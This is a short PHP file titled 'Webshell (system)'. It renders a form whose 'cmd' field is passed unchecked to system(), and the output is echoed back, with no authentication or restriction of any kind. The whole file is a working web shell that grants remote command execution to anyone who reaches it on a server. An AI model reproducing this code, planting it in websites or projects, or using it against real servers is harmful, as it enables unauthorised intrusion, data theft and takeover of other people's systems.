<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = '';

    if (function_exists('system')) {
        $output = system($command);
    } else {
        $output = "The 'system' function is not enabled.";
    }

    echo $output;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Webshell (system)</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command">
        <input type="submit" value="Send">
    </form>
</body>
</html>

